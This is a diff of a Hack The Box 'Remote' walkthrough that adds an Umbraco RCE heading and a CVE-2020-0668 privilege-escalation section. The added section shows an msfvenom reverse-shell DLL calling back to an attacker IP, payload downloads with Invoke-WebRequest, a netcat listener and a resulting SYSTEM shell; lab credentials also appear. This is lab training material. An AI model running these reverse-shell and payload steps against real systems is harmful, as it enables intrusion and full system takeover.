@@ -235,6 +235,10 @@ baconandcheese   (admin@htb.local)
 
 ![Umbraco version](images/umbraco_version.png)
 
+## Foothold
+
+### [CVE-2019-25137](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2019-25137) - Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
+
 ```bash
 $ searchsploit umbraco
 --------------------------------------------------------------------------- ---------------------------------
@@ -371,7 +375,7 @@ Network Card(s):           1 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
-## Modifiable Services - UsoSvc: AllAccess
+## Privilege Escalation
 
 ```bash
 $ python3 -m http.server 9091
@@ -391,6 +395,15 @@ Serving HTTP on 0.0.0.0 port 9091 (http://0.0.0.0:9091/) ...
 ```bash
 PS C:\> C:\Temp\winPEASany.exe
 ...
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+ [*] OS Version: 1809 (17763)
+ [*] Enumerating installed KBs...
+...
+ [!] CVE-2020-0668 : VULNERABLE
+  [>] https://github.com/itm4n/SysTracingPoc
+...
+ [*] Finished. Found 12 potential vulnerabilities.
+...
 ???????????? Modifiable Services
 ? Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
     LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
@@ -398,6 +411,8 @@ PS C:\> C:\Temp\winPEASany.exe
     UsoSvc: AllAccess, Start
 ...
 ```
+
+### Modifiable Services - UsoSvc: AllAccess
 
 ```bash
 PS C:\> sc.exe query usosvc
@@ -485,7 +500,93 @@ PS C:\Windows\system32> whoami
 nt authority\system
 ```
 
-## SeImpersonatePrivilege - Potato - JuicyPotatoNG.exe
+### [CVE-2020-0668](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2020-0668) - Microsoft Windows Service Tracing Arbitrary File Move Local Privilege Escalation Vulnerability
+
+```bash
+PS C:\> mkdir C:\Temp
+PS C:\> mkdir C:\Temp\CVE-2020-0668
+PS C:\> cd C:\Temp\CVE-2020-0668
+PS C:\Temp\CVE-2020-0668> 
+```
+
+```bash
+$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4455 -f dll -o WindowsCoreDeviceInfo.dll       
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: WindowsCoreDeviceInfo.dll
+```
+
+```bash
+$ python3 -m http.server 9091
+Serving HTTP on 0.0.0.0 port 9091 (http://0.0.0.0:9091/) ...
+```
+
+```bash
+Invoke-WebRequest -Uri 'http://10.10.14.3:9091/CVE-2020-0668.ps1' -OutFile C:\Temp\CVE-2020-0668\CVE-2020-0668.ps1
+Invoke-WebRequest -Uri 'http://10.10.14.3:9091/NtApiDotNet.dll' -OutFile C:\Temp\CVE-2020-0668\NtApiDotNet.dll
+Invoke-WebRequest -Uri 'http://10.10.14.3:9091/phonebook.pbk' -OutFile C:\Temp\CVE-2020-0668\phonebook.pbk
+Invoke-WebRequest -Uri 'http://10.10.14.3:9091/UsoDllLoader.exe' -OutFile C:\Temp\CVE-2020-0668\UsoDllLoader.exe
+Invoke-WebRequest -Uri 'http://10.10.14.3:9091/WindowsCoreDeviceInfo.dll' -OutFile C:\Temp\CVE-2020-0668\WindowsCoreDeviceInfo.dll
+```
+
+```bash
+$ python3 -m http.server 9091
+Serving HTTP on 0.0.0.0 port 9091 (http://0.0.0.0:9091/) ...
+10.10.10.180 - - [30/May/2024 00:12:43] "GET /CVE-2020-0668.ps1 HTTP/1.1" 200 -
+10.10.10.180 - - [30/May/2024 00:12:44] "GET /NtApiDotNet.dll HTTP/1.1" 200 -
+10.10.10.180 - - [30/May/2024 00:12:46] "GET /phonebook.pbk HTTP/1.1" 200 -
+10.10.10.180 - - [30/May/2024 00:12:46] "GET /UsoDllLoader.exe HTTP/1.1" 200 -
+10.10.10.180 - - [30/May/2024 00:12:47] "GET /WindowsCoreDeviceInfo.dll HTTP/1.1" 200 -
+```
+
+```bash
+PS C:\Temp\CVE-2020-0668> dir
+    Directory: C:\Temp\CVE-2020-0668
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/30/2024   4:12 AM           1659 CVE-2020-0668.ps1
+-a----        5/30/2024   4:12 AM        1167872 NtApiDotNet.dll
+-a----        5/30/2024   4:12 AM            110 phonebook.pbk
+-a----        5/30/2024   4:12 AM         153088 UsoDllLoader.exe
+-a----        5/30/2024   4:12 AM           9216 WindowsCoreDeviceInfo.dll
+```
+
+```bash
+PS C:\Temp\CVE-2020-0668> dir C:\Windows\System32\WindowsCoreDeviceInfo.dll
+
+PS C:\Temp\CVE-2020-0668> ./CVE-2020-0668.ps1
+
+PS C:\Temp\CVE-2020-0668> dir C:\Windows\System32\WindowsCoreDeviceInfo.dll
+    Directory: C:\Windows\System32
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/30/2024   4:12 AM           9216 WindowsCoreDeviceInfo.dll
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 4455
+listening on [any] 4455 ...
+```
+
+```bash
+PS C:\Temp\CVE-2020-0668> usoclient StartInteractiveScan
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 4455
+listening on [any] 4455 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.180] 49693
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+ whoami
+nt authority\system
+```
+
+### SeImpersonatePrivilege - Potato - JuicyPotatoNG.exe
 
 Download to the target [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) and `nc`.
 
@@ -523,9 +624,7 @@ whoami
 nt authority\system
 ```
 
-## CVE-2019-18988
-
-- [CVE-2019-18988](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2019-18988)
+### [CVE-2019-18988](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2019-18988) - TeamViewer7 - decrypt password
 
 ```bash
 PS C:\> tasklist /svc
@@ -611,7 +710,7 @@ remote\administrator
 | admin@htb.local | baconandcheese |
 | administrator | !R3m0te! |
 
-## CVE-2019-18988 - Metasploit
+## CVE-2019-18988 - Metasploit - TeamViewer7 - decrypt password
 
 ```bash
 $ msfconsole -q                                
